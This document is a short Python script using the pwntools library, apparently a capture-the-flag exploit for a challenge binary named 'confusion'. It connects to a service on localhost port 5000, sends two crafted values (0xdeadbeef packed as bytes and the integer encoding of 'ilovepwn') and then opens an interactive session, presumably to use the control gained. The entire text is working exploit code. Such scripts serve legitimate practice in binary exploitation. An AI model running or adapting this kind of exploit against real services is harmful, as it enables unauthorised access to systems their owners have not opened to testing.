from pwn import *

elf = context.binary = ELF("confusion")

p = remote("localhost", 5000)

p.sendline(pack(0xdeadbeef))
p.sendline(str(u64(b'ilovepwn')).encode())
p.interactive()